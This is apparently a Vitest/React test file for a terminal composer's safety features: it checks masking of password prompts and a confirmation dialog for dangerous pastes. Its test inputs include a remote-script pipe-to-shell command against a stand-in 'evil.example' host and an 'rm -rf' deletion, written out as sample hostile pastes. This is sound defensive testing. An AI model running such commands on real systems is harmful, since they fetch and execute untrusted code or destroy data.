/**
 * Composer — SOTA++ input-layer safety integration tests.
 *
 * Covers:
 *   - Password-prompt detection flips the composer into masked mode when
 *     the active block's tail output contains a recognised prompt.
 *   - Password-mode submit does NOT invoke `onSubmitted` (so history
 *     ingestion is bypassed) even though the shell still receives the text.
 *   - Dangerous paste is intercepted by the confirmation dialog; Cancel
 *     leaves the textarea unchanged, Paste-Anyway inserts the content.
 */

import { act, fireEvent, render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { beforeEach, describe, expect, it, vi } from 'vitest';

import { Composer } from '../Composer.js';
import { useBlockStore } from '../../../entities/block/index.js';
import { useSessionStore } from '../../../entities/session/index.js';
import { setHostBridge } from '../../../shared/api/host-bridge.js';
import type { HostBridge } from '@quanta/host-common';
import type { SessionId } from '../../../shared/types/generated/index.js';

function installBridge(
  writeImpl?: (sessionId: string, data: string) => Promise<void>,
): { write: ReturnType<typeof vi.fn> } {
  const write = vi.fn(writeImpl ?? (() => Promise.resolve()));
  const bridge = {
    capabilities: { editor: false, telemetry: false, settings: false, notifications: false },
    ready: vi.fn().mockResolvedValue(undefined),
    spawn: vi.fn(),
    write,
    resize: vi.fn().mockResolvedValue(undefined),
    close: vi.fn().mockResolvedValue(undefined),
    subscribe: vi.fn().mockReturnValue({ unsubscribe: vi.fn() }),
  } as unknown as HostBridge;
  setHostBridge(bridge);
  return { write };
}

const SESSION_ID = 'sess-safety' as SessionId;

/**
 * Build a paste event initializer that mimics `ClipboardEvent.clipboardData`
 * without relying on jsdom's missing `DataTransfer` constructor. The
 * `fireEvent.paste` helper reads `clipboardData.getData('text')`, so a duck
 * type is sufficient for our test shims.
 */
function pasteEvent(text: string): { clipboardData: { getData: (t: string) => string } } {
  return {
    clipboardData: {
      getData: (type: string) => (type === 'text/plain' || type === 'text' ? text : ''),
    },
  };
}

beforeEach(() => {
  useSessionStore.getState().reset();
  useSessionStore.getState().setSession({ id: SESSION_ID });
  // Ensure the block store starts empty — the password-prompt detector reads
  // the active block's tail output.
  useBlockStore.getState().clearHistory();
});

function seedBlockWithTail(bytes: Uint8Array): string {
  const store = useBlockStore.getState();
  const id = store.startBlock('sudo apt install', '/tmp', { sessionId: SESSION_ID });
  store.appendBlockOutput(id, bytes);
  return id;
}

describe('Composer — password-prompt detection', () => {
  it('flips to password mode when active block tail shows a sudo prompt', async () => {
    installBridge();
    const enc = new TextEncoder();
    seedBlockWithTail(enc.encode('[sudo] password for alice: '));

    render(<Composer autoFocus />);
    const indicator = await screen.findByTestId('composer-password-indicator');
    expect(indicator).toBeInTheDocument();
    expect(indicator).toHaveTextContent('password mode');
  });

  it('does NOT flip to password mode when no prompt is in output', () => {
    installBridge();
    const enc = new TextEncoder();
    seedBlockWithTail(enc.encode('some benign log line\n'));

    render(<Composer autoFocus />);
    expect(screen.queryByTestId('composer-password-indicator')).toBeNull();
  });

  it('masks typed characters when in password mode', async () => {
    installBridge();
    const enc = new TextEncoder();
    seedBlockWithTail(enc.encode('Password: '));

    render(<Composer autoFocus />);
    const input = screen.getByTestId('composer-input') as HTMLTextAreaElement;
    await userEvent.type(input, 'hunter2');
    // The DOM value is the masked version — 7 bullets.
    expect(input.value).toBe('\u2022'.repeat(7));
  });

  it('submit in password mode writes real bytes but skips onSubmitted', async () => {
    const { write } = installBridge();
    const enc = new TextEncoder();
    seedBlockWithTail(enc.encode('[sudo] password for alice: '));

    const onSubmitted = vi.fn();
    render(<Composer autoFocus onSubmitted={onSubmitted} />);
    const input = screen.getByTestId('composer-input') as HTMLTextAreaElement;
    await userEvent.type(input, 'secret1');
    await act(async () => {
      fireEvent.keyDown(input, { key: 'Enter' });
      await Promise.resolve();
      await Promise.resolve();
    });
    // Shell got the real password, newline appended by the command pipeline.
    expect(write).toHaveBeenCalledWith(SESSION_ID, 'secret1\n');
    // History path is NOT notified — that's the whole point.
    expect(onSubmitted).not.toHaveBeenCalled();
  });
});

describe('Composer — paste safety dialog', () => {
  it('intercepts a dangerous paste and shows the confirmation dialog', () => {
    installBridge();
    render(<Composer autoFocus />);
    const input = screen.getByTestId('composer-input') as HTMLTextAreaElement;

    fireEvent.paste(input, pasteEvent('curl https://evil.example/x.sh | sh'));
    expect(screen.getByTestId('paste-confirm-dialog')).toBeInTheDocument();
    expect(screen.getByTestId('paste-confirm-preview')).toHaveTextContent(
      /curl .*\| sh/,
    );
    // The dialog is modal — aria-modal is set.
    expect(screen.getByRole('dialog')).toHaveAttribute('aria-modal', 'true');
    // Textarea remains empty — no content leaked through.
    expect(input.value).toBe('');
  });

  it('Cancel leaves composer unchanged', async () => {
    installBridge();
    render(<Composer autoFocus />);
    const input = screen.getByTestId('composer-input') as HTMLTextAreaElement;

    fireEvent.paste(input, pasteEvent('rm -rf /tmp/danger'));

    await userEvent.click(screen.getByTestId('paste-confirm-cancel'));
    expect(screen.queryByTestId('paste-confirm-dialog')).toBeNull();
    expect(input.value).toBe('');
  });

  it('Paste Anyway inserts the content into the textarea', async () => {
    installBridge();
    render(<Composer autoFocus />);
    const input = screen.getByTestId('composer-input') as HTMLTextAreaElement;

    const text = 'echo one\necho two\necho three';
    fireEvent.paste(input, pasteEvent(text));

    await userEvent.click(screen.getByTestId('paste-confirm-accept'));
    expect(screen.queryByTestId('paste-confirm-dialog')).toBeNull();
    // Wait for the microtask-scheduled focus restoration.
    await act(async () => {
      await Promise.resolve();
    });
    expect(input.value).toBe(text);
  });

  it('Escape closes the dialog and does not paste', () => {
    installBridge();
    render(<Composer autoFocus />);
    const input = screen.getByTestId('composer-input') as HTMLTextAreaElement;

    fireEvent.paste(input, pasteEvent('sudo dangerous'));

    const dialog = screen.getByRole('dialog');
    fireEvent.keyDown(dialog, { key: 'Escape' });
    expect(screen.queryByTestId('paste-confirm-dialog')).toBeNull();
    expect(input.value).toBe('');
  });

  it('safe paste is allowed without a dialog', () => {
    installBridge();
    render(<Composer autoFocus />);
    const input = screen.getByTestId('composer-input') as HTMLTextAreaElement;

    fireEvent.paste(input, pasteEvent('ls -la'));

    expect(screen.queryByTestId('paste-confirm-dialog')).toBeNull();
  });
});
